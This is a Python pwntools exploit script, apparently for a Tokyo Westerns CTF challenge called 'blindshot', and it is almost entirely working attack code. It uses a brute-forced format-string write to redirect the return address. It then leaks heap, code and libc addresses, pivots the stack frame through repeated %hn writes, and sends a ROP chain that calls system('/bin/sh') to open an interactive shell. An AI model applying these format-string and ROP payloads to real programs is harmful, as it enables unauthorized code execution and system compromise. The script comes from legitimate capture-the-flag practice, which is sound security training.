# i couldnt solve this on time
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './blindshot'
# TARGET = './edit'
HOST = 'pwn01.chal.ctf.westerns.tokyo'
PORT = 12463

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

while(1):
    r = start()
    payload = ''

    #  put (rbp+0xa0) & 0xff to %13
    payload += '%16x'*10 + '%*x%hhn'

    # put (rbp-0x18) & 0xffff to %18
    payload += '%16x'*3 + '%{}x%hn'.format((0x10000-0x18)-0x10*13)

    # put (rbp-0x18-0x8) & 0xffff to %34
    payload += '%16x'*14 + '%{}x%hn'.format((0x10000-0x8)-0x10*14)

    # put inverse and 0x91 to %46 ( ret addr )
    # (rbp - 0x18 - 0x8 + (rbp+0xa0) * 3)
    #  = rbp * 4 + 0x1c0
    # if rbp & 0xff in [0x10, 0x50, 0x90, 0xd0]
    # this will be inverse ( 1/4 )

    payload += '%1$*45$x'*3 + '%{}c%46$hhn'.format(0x91) 
    payload += '%{}c'.format(0x101-0x91)

    r.sendlineafter('> ', payload)
    try: 
        r.recvuntil('> ')
        break
    except:
        r.close()

if args.D:
    debug(r, [0x130b, 0x1350])

# leak all
payload  = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '_%9$015lx_%11$015lx_%12$015lx_%16$015lx' #16*4
payload += '!%{}c'.format(0x100-0x91-16*4+3-1)
r.sendline(payload)
leak = r.recvuntil('!')[:-1].split('_')
heap = int(leak[1], 16) - 0x780
ret  = int(leak[2], 16) - 0x18
code = int(leak[3], 16) - 0x129b
base = int(leak[4], 16) - 0x270b3

dbg('heap')
dbg('ret')
dbg('code')
dbg('base')
system = base + 0x55410
binsh = base + 0x1b75aa
rdi = code+0x13c3

# point to rbp + 0
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%34$hn'.format(((ret-8) & 0xffff)-0x91)
payload += '%{}c'.format(0x100-((ret-8) & 0xff)+3)
r.sendlineafter('> ', payload)

# write rbp first 2byte
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%48$hn'.format(((heap+0xa90) & 0xffff)-0x91)
payload += '%{}c'.format(0x10000-((heap+0xa90) & 0xffff)+3)
r.sendlineafter('> ', payload)

# point to rbp + 2
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%34$hn'.format(((ret-8+2) & 0xffff)-0x91)
payload += '%{}c'.format(0x100-((ret-8+2) & 0xff)+3)
r.sendlineafter('> ', payload)

# write rbp middle 2byte
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%48$hn'.format((((heap+0xa90) >> 16) & 0xffff)-0x91)
payload += '%{}c'.format(0x10000-(((heap+0xa90) >> 16) & 0xffff)+3)
r.sendlineafter('> ', payload)

# point to rbp + 4
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%34$hn'.format(((ret-8+4) & 0xffff)-0x91)
payload += '%{}c'.format(0x100-((ret-8+4) & 0xff)+3)
r.sendlineafter('> ', payload)

# write rbp last 2byte
payload = ''
payload += '%{}c%46$hhn'.format(0x91)      #91
payload += '%{}c%48$hn'.format((((heap+0xa90) >> 32) & 0xffff)-0x91)
payload += '%{}c'.format(0x10000-(((heap+0xa90) >> 32) & 0xffff)+3)
r.sendlineafter('> ', payload)

# insert rop here
payload = ''
payload += 'A'*8
payload += flat(rdi+1, rdi, binsh, system)

r.sendlineafter('> ', payload)

r.interactive()
r.close()
